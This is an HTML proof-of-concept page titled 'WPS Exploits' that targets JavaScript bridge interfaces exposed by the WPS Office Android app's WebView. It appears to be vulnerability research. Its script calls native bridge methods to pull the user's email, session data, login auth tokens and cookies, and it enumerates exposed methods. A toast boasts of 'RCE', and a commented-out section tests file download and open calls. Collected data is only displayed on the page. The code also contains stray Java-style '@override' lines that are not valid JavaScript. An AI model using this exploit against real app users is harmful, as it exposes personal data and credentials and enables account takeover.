<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
        integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <title>WPS Exploits</title>
</head>
<!-- 
JSDownload
JSGetClientInfo
JSGetPaymentWay
JSIntentSchemeURI
JSSupportLaunchDeeplink
collectData
collectDataV3
goToLoginAndCallBackUserInfo
jsOpenDefinedInterface -> new file , user
jsOpenFile
requestSession
requestSessionUserInfo
shareWx
startTask
 -->

<body>
    <h1>WPS Exploits</h1>
    <script type="text/javascript">
        var string = "";

        //APPS JS CALLBACKS
        function loginCallback() {
            try {
                document.getElementById("myP").innerHTML = splash.goToLoginAndCallBackUserInfo()
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }
        function appJs_loginCallback(x, y) {
            try {
                document.getElementById("myP").innerHTML = x + "\n\n" + y;
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }
        

        function loginCallbackAuthToken() {
            splash.goToLoginAndCallBackUserInfo()
            try {
                document.getElementById("myP").innerHTML = splash.goToLoginAndCallBack()
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }
        @override
        function appJs_loginCallback(x) {
            try {
                document.getElementById("myP").innerHTML = x;
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }


        function requestSess() {
            try {
                document.getElementById("myP").innerHTML = splash.requestSession();
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }
        @override
        function appJs_sessionCallback(x) {
            try {
                document.getElementById("myP").innerHTML = x;
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }


        function requestSessUserInfo() {
            try {
                document.getElementById("myP").innerHTML = splash.requestSessionUserInfo();
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }
        function appJs_sessionCallback(x, y) {
            try {
                document.getElementById("myP").innerHTML = x + "\n\n" + y;
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        

        


        //used function

        function findAllVariables() {
            for (let variable in window) {
                if (window.hasOwnProperty(variable)) {

                    var ul = document.getElementById("list");
                    var li = document.createElement("li");
                    li.className = "list-group-item"
                    li.appendChild(document.createTextNode(variable));
                    ul.appendChild(li);
                }
            }
            // = string;
        }

        function getMethodsNames(obj) {
            return Object.keys(obj)
                .filter((key) => typeof obj[key] === 'function');
        }

        // Get the Object's methods (functions):
        function getMethods(obj) {
            return Object.keys(obj)
                .filter((key) => typeof obj[key] === 'function')
                .map((key) => obj[key]);
        }


        function getObj(obj) {
            try {
                document.getElementById("myP").innerHTML = getMethodsNames(obj);
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function call() {
            try {
                document.getElementById("myP").innerHTML = splash.JSGetClientInfo();
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function showToastJS() {
            try {
                //qing.JSShowToast("test 1");
                //splash.JSShowToast("test 2");
                WpsJSOverseaBridge.JSShowToast("Hey I just showed a custom toast that is coded in Java in your app!! RCE is fun");
                //string.JSShowToast("test 4");
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }


        function getUserMail() {
            try {
                document.getElementById("myP").innerHTML = splash.jsGetUserMail();
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function getCookies() {
            try {
                document.getElementById("myP").innerHTML = document.cookie;
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }


        //TEST FUNCTIONS
        function trackingInfo() {
            try {
                document.getElementById("myP").innerHTML = splash.trackingInfo("wps_sid");
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function tryDownload() {
            try {
                document.getElementById("myP").innerHTML = splash.JSDownload("random", "https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/testFINDME.txt")
                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        
        function testGetFile() {
            try {
                document.getElementById("myP").innerHTML = splash.jsOpenFile("/sdcard/test", "{\"phonetype\":\"N95\",\"cat\":\"WP\"}", "txt")
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function JSGetPaymentWay() {
            try {
                document.getElementById("myP").innerHTML = splash.JSGetPaymentWay()
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function JSIntentSchemeURI() {
            try {
                document.getElementById("myP").innerHTML = splash.JSIntentSchemeURI("https://bing.com", 2);
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function shareWx() {
            try {
                document.getElementById("myP").innerHTML = splash.shareWx("https://bing.com", "https://bing.com");
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function startTask() {
            try {
                document.getElementById("myP").innerHTML = splash.startTask("https://bing.com");
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }

        function printShit(){
            try {
                document.getElementById("myP").innerHTML = "START\n";
                document.getElementById("myP").innerHTML += "wpsCreateFunction: "+JSON.stringify(wpsCreateFunction)+"\n\n"
                document.getElementById("myP").innerHTML += "wpsS2i: "+JSON.stringify(wpsS2i)+"\n\n"
                document.getElementById("myP").innerHTML += "wpsVersionCmp: "+JSON.stringify(wpsVersionCmp)+"\n\n"
                document.getElementById("myP").innerHTML += "SDKVersion: "+JSON.stringify(SDKVersion)+"\n\n"
                document.getElementById("myP").innerHTML += "WpsPlatformType: "+JSON.stringify(WpsPlatformType)+"\n\n"
                document.getElementById("myP").innerHTML += "wpsSdkRegister: "+JSON.stringify(wpsSdkRegister)+"\n\n"
                document.getElementById("myP").innerHTML += "_listeners: "+JSON.stringify(_listeners)+"\n\n"
                document.getElementById("myP").innerHTML += "wpsBridgeEvent: "+JSON.stringify(wpsBridgeEvent)+"\n\n"
                document.getElementById("myP").innerHTML += "Invoker: "+JSON.stringify(Invoker)+"\n\n"
                document.getElementById("myP").innerHTML += "wps: "+JSON.stringify(wps)+"\n\n"
                document.getElementById("myP").innerHTML += "__wpsoffice_environment: "+JSON.stringify(__wpsoffice_environment)+"\n\n"
                document.getElementById("myP").innerHTML += "owWps: "+JSON.stringify(owWps)+"\n\n"
                document.getElementById("myP").innerHTML += "canIUseApis: "+JSON.stringify(canIUseApis)+"\n\n"
                document.getElementById("myP").innerHTML += "__wpsoffice_app_ver: "+JSON.stringify(__wpsoffice_app_ver)+"\n\n"
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
            
        }

        function printShit2(){
            try {
                document.getElementById("myP").innerHTML = "START 2\n";
                document.getElementById("myP").innerHTML += "wps: "+getMethodsNames(wps)+"\n"
                document.getElementById("myP").innerHTML += "owWps: "+getMethodsNames(owWps)+"\n"
                document.getElementById("myP").innerHTML += "canIUseApis: "+getMethodsNames(canIUseApis)+"\n"
            } catch (error) {
                document.getElementById("myP").innerHTML = error;
            }
        }
    </script>

    <button onclick="findAllVariables()">
        List all values in the DOM
    </button>
    <br>
    <button onclick="getCookies()">
        Show Cookies
    </button>
    <br>
    <h6>Print the functions/methods of the defined JSInterfaces</h6>
    <button onclick="getObj(qing)">
        Get Qing
    </button>

    <button onclick="getObj(splash)">
        Get Splah
    </button>

    <button onclick="getObj(WpsJSOverseaBridge)">
        Get Wps
    </button>
    <br>
    <button onclick="getObj(wpsAndroidBridge)">
        Get WpsBRIDGE
    </button>
    
    <button onclick="wpsAndroidBridge.init()">
        Init WpsBRIDGE
    </button>
    <br>
    <h6>Just basic JSInterface stuff -> can make a custom toast!</h6>
    <button onclick="call()">
        Call JSGetClientInfo() - Native Function
    </button>
    <br>
    <button onclick="showToastJS()">
        Call showToast() - Native Function
    </button>
    <br>

    <h6>These are calls to various JSInterfaces that expose PII or Auth keys</h6>
    <button onclick="getUserMail()">
        Call Get User Mail - Native Function
    </button>

    <br>
    <button onclick="requestSess()">
        Call requestSess - Native Function
    </button>

    <br>
    <button onclick="requestSessUserInfo()">
        Call requestSessUserInfo - Native Function
    </button>

    <br>
    <button onclick="loginCallback()">
        Call callback login - Native Function

    </button>

    <br>
    <button onclick="loginCallbackAuthToken()">
        Call login and get Auth token  - Native Function"
    </button>


    <!--  
    <br>
    <button onclick="testGetFile()">
        Call File - Native Function

    </button>

    <br>
    <button onclick="JSGetPaymentWay()">
        Call JSGetPaymentWay
    </button>

    <br>
    <button onclick="JSIntentSchemeURI()">
        Call JSIntentSchemeURI
    </button>

    <br>
    <button onclick="shareWx()">
        Call shareWx
    </button>

    <br>
    <button onclick="startTask()">
        Call startTask
    </button>

    <br>
    <button onclick="trackingInfo()">
        Call trackingInfo - Native Function
    </button>

    <br>
    <button onclick="tryDownload()">
        Call download - Native Function

    </button>

    -->
    <h6>NEW TEST AREA</h6>
    <br>
    <button onclick="getMethodsNames(wpsS2i)">
        List wpsS2i

    </button>
    <br>
    <button onclick="getMethodsNames(wpsVersionCmp)">
        List wpsVersionCmp

    </button>

    <br>
    <button onclick='printShit()'>
        List ALL
    </button>

    <br>
    <button onclick='printShit2()'>
        List Shit2
    </button>



    


    <p id="myP">

    </p>
    <ul class="list-group" id="list">
    </ul>


    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
        crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
        crossorigin="anonymous"></script>
</body>

</html>